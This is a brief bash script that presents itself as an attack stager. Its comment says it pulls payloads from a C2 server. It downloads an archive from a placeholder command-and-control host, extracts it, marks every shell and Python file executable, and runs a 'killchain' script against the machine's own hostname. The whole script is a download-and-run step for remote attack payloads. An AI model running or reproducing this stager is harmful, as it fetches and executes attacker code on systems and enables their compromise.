#!/bin/bash
# Pull latest payloads from C2
curl -s http://YOUR_C2/latest_suite.tar.gz | tar xz
chmod +x *.sh *.py
./killchain.sh $(hostname).local